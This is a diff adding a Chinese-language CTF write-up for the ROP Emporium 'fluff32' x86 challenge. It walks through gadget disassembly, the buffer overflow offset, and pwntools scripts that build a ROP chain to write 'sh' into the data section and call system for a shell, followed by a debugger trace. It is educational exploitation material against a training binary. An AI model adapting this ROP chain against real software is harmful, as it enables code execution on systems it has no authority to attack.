@@ -379,3 +379,332 @@ p.interactive()
 ![image-20200503175326009](image-20200503175326009.png)
 
 pwn！
+
+### x86
+
+不多说废话，还是在 `questionableGadgets()` 函数
+
+```asm
+                    ********************************************
+                    *                 FUNCTION                 *
+                    ********************************************
+                    undefined questionableGadgets()
+         undefined    AL:1      <RETURN>
+                    questionableGadgets               XREF[1]: Entry Point(*)  
+   08048670 5f         POP     EDI
+   08048671 31 d2      XOR     EDX,EDX
+   08048673 5e         POP     ESI
+   08048674 bd be      MOV     EBP,0xcafebabe
+            ba fe ca
+   08048679 c3         RET
+   0804867a 5e         POP     ESI
+   0804867b 31 da      XOR     EDX,EBX
+   0804867d 5d         POP     EBP
+   0804867e bf be      MOV     EDI,0xdeadbabe
+            ba ad de
+   08048683 c3         RET
+   08048684 bf ef      MOV     EDI,0xdeadbeef
+            be ad de
+   08048689 87 ca      XCHG    EDX,ECX
+   0804868b 5d         POP     EBP
+   0804868c ba d0      MOV     EDX,0xdefaced0
+            ce fa de
+   08048691 c3         RET
+   08048692 5f         POP     EDI
+   08048693 89 11      MOV     dword ptr [ECX],EDX
+   08048695 5d         POP     EBP
+   08048696 5b         POP     EBX
+   08048697 30 19      XOR     byte ptr [ECX],BL
+   08048699 c3         RET
+   0804869a 66 90      NOP
+   0804869c 66 90      NOP
+   0804869e 66 90      NOP
+```
+
+![image-20200503181532345](image-20200503181532345.png)
+
+我们的目的是写内存，直接找到能写内存的 `gadget`
+
+```asm
+   08048692 5f         POP     EDI
+   08048693 89 11      MOV     dword ptr [ECX],EDX
+   08048695 5d         POP     EBP
+   08048696 5b         POP     EBX
+   08048697 30 19      XOR     byte ptr [ECX],BL
+   08048699 c3         RET
+```
+
+写入 `ecx` 存的地址
+
+找，怎么给 `ecx` 赋值：
+
+```asm
+   08048689 87 ca      XCHG    EDX,ECX
+   0804868b 5d         POP     EBP
+   0804868c ba d0      MOV     EDX,0xdefaced0
+            ce fa de
+   08048691 c3         RET
+```
+
+通过 `edx`
+
+找，怎么给 `edx` 赋值：
+
+```asm
+   0804867a 5e         POP     ESI
+   0804867b 31 da      XOR     EDX,EBX
+   0804867d 5d         POP     EBP
+   0804867e bf be      MOV     EDI,0xdeadbabe
+            ba ad de
+   08048683 c3         RET
+```
+
+这个异或会把结果放进 `edx`，要么能找到 `pop edx` 和 `xor ebx,ebx` 要么 `pop ebx` 和 `xor edx,edx`
+
+有：
+
+```asm
+   08048670 5f         POP     EDI
+   08048671 31 d2      XOR     EDX,EDX
+   08048673 5e         POP     ESI
+   08048674 bd be      MOV     EBP,0xcafebabe
+            ba fe ca
+   08048679 c3         RET
+```
+
+ROPgadget 找一下有没有 `pop ebx; ret`
+
+![image-20200503182259756](image-20200503182259756.png)
+
+有
+
+```asm
+0x080483e1 : pop ebx ; ret
+```
+
+好了，现在能设置写入的内存地址了
+
+------
+
+找一下，写字符串怎么放进去
+
+一样，逆向找：
+
+```asm
+   08048693 89 11      MOV     dword ptr [ECX],EDX
+```
+
+需要设置 `edx`
+
+没有直接 `pop edx`，只能间接赋值
+
+```asm
+   0804867b 31 da      XOR     EDX,EBX
+```
+
+这个异或会把结果放进 `edx`，要么能找到 `pop edx` 和 `xor ebx,ebx` 要么 `pop ebx` 和 `xor edx,edx`
+
+发现了吗，跟设置 ecx 的某些步骤重叠了
+
+有：
+
+```asm
+   08048670 5f         POP     EDI
+   08048671 31 d2      XOR     EDX,EDX
+   08048673 5e         POP     ESI
+   08048674 bd be      MOV     EBP,0xcafebabe
+            ba fe ca
+   08048679 c3         RET
+```
+
+ROPgadget 找一下有没有 `pop ebx; ret`
+
+![image-20200503182259756](image-20200503182259756.png)
+
+漏洞点
+
+![image-20200503184206069](image-20200503184206069.png)
+
+填充长度：`0x28 + 0x4`
+
+好了，可以写 payload 了：
+
+逆序看找 gadget 的步骤，只能先设置 ecx 的值，因为先设置 edx 的话我们没办法清空设置 edx 时 ecx 设置的值
+
+设置 ecx，ecx 是要设置一个可写可读的内存的起始地址
+
+![image-20200503185850631](image-20200503185850631.png)
+
+data 段可以，地址：`0x0804a028`
+
+```python
+from pwn import *
+
+context.terminal = ["tmux", "split-window", "-h"]
+p = process("./fluff32")
+data_section = 0x0804a028
+pop_ebx_ret = 0x080483e1
+pop_edi_xor_edx_edx_pop_esi_ret = 0x08048670
+pop_esi_xor_edx_ebx_pop_ebp_ret = 0x0804867a
+xchg_edx_ecx_pop_ebp_ret = 0x08048689
+pop_edi_write_ecx_men_pop_ebp_pop_ebx_xor_ecx_bl_ret = 0x08048692
+
+exp = "A" * 0x2c
+
+exp += p32(pop_ebx_ret)
+exp += p32(data_section)
+
+exp += p32(pop_edi_xor_edx_edx_pop_esi_ret)
+exp += "AAAA"
+exp += "AAAA"
+
+exp += p32(pop_esi_xor_edx_ebx_pop_ebp_ret)
+exp += "AAAA"
+exp += "AAAA"
+
+exp += p32(xchg_edx_ecx_pop_ebp_ret)
+exp += "AAAA"
+
+gdb.attach(pidof(p)[0])
+p.sendline(exp)
+p.interactive()
+```
+
+`gdb attach` 上去看一下 `ecx` 的置有没有成功设置
+
+![image-20200503191912942](image-20200503191912942.png)
+
+可以看到，构造的 ROP 链成功设置了 ecx 的值为 data_section
+
+现在 开始写 设置 ebx 的那部分 payload
+
+现在的 edx 被污染了，需要清空，调用 `xor edx,edx` 就能清空 `edx`（自己和自己异或肯定等于 0 啊）
+
+```asm
+   08048671 31 d2      XOR     EDX,EDX
+   08048673 5e         POP     ESI
+   08048674 bd be      MOV     EBP,0xcafebabe
+            ba fe ca
+   08048679 c3         RET
+```
+
+这个可以，ok，写
+
+```python
+from pwn import *
+
+context.terminal = ["tmux", "split-window", "-h"]
+p = process("./fluff32")
+fluff32 = ELF("./fluff32")
+
+sh = "sh\x00\x00"
+system_plt = fluff32.plt["system"]
+data_section = 0x0804a028
+
+pop_ebx_ret = 0x080483e1
+pop_edi_xor_edx_edx_pop_esi_ret = 0x08048670
+pop_esi_xor_edx_ebx_pop_ebp_ret = 0x0804867a
+xchg_edx_ecx_pop_ebp_ret = 0x08048689
+pop_edi_write_ecx_men_pop_ebp_pop_ebx_xor_ecx_bl_ret = 0x08048692
+
+xor_edx_ebx_pop_ebp_ret = 0x0804867b
+
+
+exp = "A" * 0x2c
+
+exp += p32(pop_ebx_ret)
+exp += p32(data_section)
+
+exp += p32(pop_edi_xor_edx_edx_pop_esi_ret)
+exp += "AAAA"
+exp += "AAAA"
+
+exp += p32(pop_esi_xor_edx_ebx_pop_ebp_ret)
+exp += "AAAA"
+exp += "AAAA"
+
+exp += p32(xchg_edx_ecx_pop_ebp_ret)
+exp += "AAAA"
+
+exp += p32(pop_ebx_ret)
+exp += (sh)
+
+exp += p32(pop_edi_xor_edx_edx_pop_esi_ret)
+exp += "AAAA"
+exp += "AAAA"
+
+exp += p32(xor_edx_ebx_pop_ebp_ret)
+exp += "AAAA"
+
+exp += p32(pop_edi_write_ecx_men_pop_ebp_pop_ebx_xor_ecx_bl_ret)
+exp += "AAAA"
+exp += "AAAA"
+exp += "\x00\x00\x00\x00"
+
+exp += p32(system_plt)
+exp += p32(0xdeadbeef)
+exp += p32(data_section)
+
+
+gdb.attach(pidof(p)[0])
+p.sendline(exp)
+p.interactive()
+```
+
+ROP 汇编：
+
+```asm
+   0x804864b <pwnme+85>                  ret    
+    ↓
+   0x80483e1 <_init+33>                  pop    ebx
+   0x80483e2 <_init+34>                  ret    
+    ↓
+   0x8048670 <questionableGadgets>       pop    edi
+   0x8048671 <questionableGadgets+1>     xor    edx, edx
+   0x8048673 <questionableGadgets+3>     pop    esi
+   0x8048674 <questionableGadgets+4>     mov    ebp, 0xcafebabe
+   0x8048679 <questionableGadgets+9>     ret    
+     ↓
+   0x804867a <questionableGadgets+10>    pop    esi
+   0x804867b <questionableGadgets+11>    xor    edx, ebx
+   0x804867d <questionableGadgets+13>    pop    ebp
+   0x804867e <questionableGadgets+14>    mov    edi, 0xdeadbabe
+   0x8048683 <questionableGadgets+19>    ret    
+    ↓
+   0x8048689 <questionableGadgets+25>    xchg   edx, ecx
+   0x804868b <questionableGadgets+27>    pop    ebp
+   0x804868c <questionableGadgets+28>    mov    edx, 0xdefaced0
+   0x8048691 <questionableGadgets+33>    ret    
+    ↓
+   0x80483e1 <_init+33>                  pop    ebx
+   0x80483e2 <_init+34>                  ret    
+    ↓
+   0x8048670 <questionableGadgets>       pop    edi
+   0x8048671 <questionableGadgets+1>     xor    edx, edx
+   0x8048673 <questionableGadgets+3>     pop    esi
+   0x8048674 <questionableGadgets+4>     mov    ebp, 0xcafebabe
+   0x8048679 <questionableGadgets+9>     ret    
+    ↓
+   0x804867b <questionableGadgets+11>    xor    edx, ebx
+   0x804867d <questionableGadgets+13>    pop    ebp
+   0x804867e <questionableGadgets+14>    mov    edi, 0xdeadbabe
+   0x8048683 <questionableGadgets+19>    ret    
+    ↓
+   0x8048692 <questionableGadgets+34>    pop    edi
+   0x8048693 <questionableGadgets+35>    mov    dword ptr [ecx], edx
+   0x8048693 <questionableGadgets+35>    mov    dword ptr [ecx], edx
+   0x8048695 <questionableGadgets+37>    pop    ebp
+   0x8048696 <questionableGadgets+38>    pop    ebx
+   0x8048697 <questionableGadgets+39>    xor    byte ptr [ecx], bl
+   0x8048699 <questionableGadgets+41>    ret    
+    ↓
+   0x8048430 <system@plt>                jmp    dword ptr [system@got.plt] <0x804a018>
+```
+
+成功设置 `ecx` 和 `edx` 的值
+
+![image-20200503203556821](image-20200503203556821.png)
+
+![image-20200503203739489](image-20200503203739489.png)
+
+pwn!
